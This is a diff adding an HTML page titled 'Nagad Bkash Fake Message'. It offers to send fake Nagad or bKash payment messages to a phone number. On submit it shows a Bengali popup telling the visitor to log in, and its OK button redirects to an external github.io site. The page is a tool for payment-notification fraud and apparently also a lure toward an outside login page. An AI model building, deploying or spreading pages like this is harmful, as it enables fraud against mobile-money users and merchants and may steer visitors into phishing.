@@ -1,0 +1,122 @@
+<!DOCTYPE html>I 
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nagad Bkash Fake Message</title>
+    <style>
+        body {
+            background-color: #000;
+            color: #0f0;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            max-width: 500px;
+            padding: 20px;
+            background-color: #111;
+            border: 1px solid #0f0;
+            border-radius: 5px;
+            box-shadow: 0 0 15px rgba(0, 255, 0, 0.3);
+            text-align: center;
+        }
+
+        input[type="text"], select, textarea, button {
+            width: calc(100% - 20px);
+            height: 40px;
+            margin: 10px auto;
+            padding: 8px;
+            font-size: 16px;
+            border: 1px solid #0f0;
+            border-radius: 4px;
+            background-color: #000;
+            color: #0f0;
+            display: block;
+            box-sizing: border-box;
+        }
+
+        textarea {
+            resize: none;
+            height: 80px;
+        }
+
+        button {
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        button:hover {
+            background-color: #0f0;
+            color: #000;
+        }
+
+        .popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: #111;
+            border: 1px solid #0f0;
+            padding: 20px;
+            text-align: center;
+            border-radius: 5px;
+            box-shadow: 0 0 15px rgba(0, 255, 0, 0.5);
+        }
+
+        .popup button {
+            margin: 10px 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Fake Message Sent</h2>
+        <form id="checkForm">
+            <input type="text" id="phoneNumber" placeholder="Enter your phone number (e.g. 01XXXXXXXXX)" required>
+
+            <select id="Select Option" required>
+                <option value="" disabled selected>Select Payment Option</option>
+                <option value="Nagad">Nagad</option>
+                <option value="Bkash">Bkash</option>
+            </select>
+
+            <textarea id="messageBox" placeholder="Enter your message" required></textarea>
+
+            <button type="submit">Submit</button>
+        </form>
+    </div>
+
+    <div class="popup" id="popup">
+        <p>আপনার লগইন করা নেই দয়া করে লগইন করুন</p>
+        <button id="cancelBtn">Cancel</button>
+        <button id="okBtn">Ok</button>
+    </div>
+
+    <script>
+        document.getElementById('checkForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            // Show popup
+            const popup = document.getElementById('popup');
+            popup.style.display = 'block';
+        });
+
+        // Cancel button hides the popup
+        document.getElementById('cancelBtn').addEventListener('click', function() {
+            const popup = document.getElementById('popup');
+            popup.style.display = 'none';
+        });
+
+        // Ok button redirects to the link
+        document.getElementById('okBtn').addEventListener('click', function() {
+            window.location.href = "https://brillianttopup.github.io/1219/";
+        });
+    </script>
+</body>
+</html>
